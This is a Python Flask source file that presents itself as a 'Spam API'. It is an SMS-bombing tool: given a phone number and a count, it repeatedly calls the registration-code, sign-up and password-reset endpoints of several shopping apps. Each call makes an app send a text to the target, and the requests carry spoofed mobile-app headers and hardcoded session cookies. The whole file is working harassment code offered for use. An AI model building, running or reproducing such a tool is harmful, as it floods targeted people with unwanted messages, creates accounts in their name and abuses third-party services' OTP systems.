from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        data = request.json
        phone_number = data.get('phone_number')
        num_messages = int(data.get('num_messages'))
        random_chars = data.get('random_chars')
        results = send_requests(phone_number, num_messages, random_chars)
        return jsonify(results)
    return "Welcome to the Spam API!"

def send_requests(phone_number, num_messages, random_chars):
    results = []

    # Tawfeer Market Register
    url = "https://apis.tawfeermarket.com/api/v2/auth/register"
    payload = json.dumps({
        "name": "alguhanmy alguhanmy",
        "phone": "+2" + phone_number,
        "password": "Ahmed123",
        "w_i": "Ynhtbmg1zssOjE8Y3iYa9w==",
        "platform": "android",
        "gender": "male",
        "age": "1990-8-8"
    })
    headers = {
        'User-Agent': "Dart/3.3 (dart:io)",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'x-device': "qgZShOhaMa2lyhsiaGa3+XMdJ7WOQKeY10yVL3mI9d8=",
        'authorization': "Bearer null",
        'x-build': "202404241",
        'x-connectivity': "1",
        'x-localization': "ar",
        'x-area': "",
        'keep-alive': "timeout=5, max=100",
        'x-store': "",
        'x-platform': "android"
    }
    response = requests.post(url, data=payload, headers=headers)
    results.append(f"Tawfeer Market Register: {response.status_code} - {response.text}")

    for i in range(num_messages):
        # Elfar Market Send Registration Code
        url = "https://elfarmarket.com/api/customer/send_registration_code"
        params = {
            'channel_id': "-1",
            'locale': "en",
            'token': "true"
        }
        payload = json.dumps({
            "country_code": "+2",
            "phone": phone_number
        })
        headers = {
            'User-Agent': "Android/2.0 build number: 62",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'locale': "en",
            'Cookie': "elfar_session=eyJpdiI6Ijk5QVFRXC9YSFhuelhSa3dVSGNRKzF3PT0iLCJ2YWx1ZSI6Im16U0M0SlBKOEo2ek1oNVRjZmtFYW92cnFsMEo1aWlETzZIenpoZzF4QU5xZThkaERNSE5NQVZ5Wlk1XC9HdllhaTY2T2RwYXpjb2xIa2J0XC9qZkVmK25BSUpnbkVhcE9tZFc0a0tBVWROdmJqVk5RdGdcL2tvd1lIak41NVhhSmdMIiwibWFjIjoiYjViMmY2NDk2MGQ2ZGE0N2QxNTNjYmJiYjNjNDBkNWU2NzQyODM2YmM5OTIxM2Y2MWMyYWM0Mzg4YWZhMzYxOSJ9; expires=Mon, 13-Jan-2025 08:58:11 GMT; Max-Age=720000; path=/; domain=elfarmarket.com"
        }
        response = requests.post(url, params=params, data=payload, headers=headers)
        results.append(f"Elfar Market Send Registration Code {i+1}: {response.status_code} - {response.text}")

        # Gem Market Send Registration Code
        url = "https://gem-backend-prod.azurewebsites.net/api/customer/send_registration_code"
        params = {
            'channel_id': "0",
            'locale': "en",
            'token': "true"
        }
        payload = json.dumps({
            "country_code": "+2",
            "phone": phone_number
        })
        headers = {
            'User-Agent': "Android/1.3 build number: 10",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'locale': "en",
            'Cookie': "beagmal_session=eyJpdiI6IjkrQ2RGdGhOaHVKS2pVaElOZ0FUWkE9PSIsInZhbHVlIjoiMWwrV0wzNXU3VHB1UTNiVzZsNnQ4bG9mUUNGM04yeEI0VGtTXC9MWXJsWklaWWhUM1RCeGRnRnhieG80VXd1blJBSlwvUHJCMXdzU1pHUnVldlRMajlPalpZOUNEbW5Nb3dOaEhyNnVxY2Y5WVpsZ0RpS01WY0pDaU95bkxHVXRSNSIsIm1hYyI6IjRhMjk0MDczMGY2YjI4YmNkMzQ0NzY5OGFjYTBhMjUxODE0YTRjMmE4NjU2NTZhMGZkNDYxMGE2MjMyYzg0ZGEifQ%3D%3D; expires=Mon, 13-Jan-2025 09:33:01 GMT; Max-Age=720000; path=/; secure; samesite=none"
        }
        response = requests.post(url, params=params, data=payload, headers=headers)
        results.append(f"Gem Market Send Registration Code {i+1}: {response.status_code} - {response.text}")

        # Tawfeer Market Forget Password
        url = "https://apis.tawfeermarket.com/api/v2/forget/password"
        payload = json.dumps({
            "phone": "+2" + phone_number
        })
        headers = {
            'User-Agent': "Dart/3.3 (dart:io)",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'x-device': "qgZShOhaMa2lyhsiaGa3+XMdJ7WOQKeY10yVL3mI9d8=",
            'authorization': "Bearer null",
            'x-build': "202404241",
            'x-connectivity': "1",
            'x-localization': "ar",
            'x-area': "",
            'keep-alive': "timeout=5, max=100",
            'x-store': "",
            'x-platform': "android"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Tawfeer Market Forget Password {i+1}: {response.status_code} - {response.text}")

    return results

if __name__ == '__main__':
    app.run(debug=True)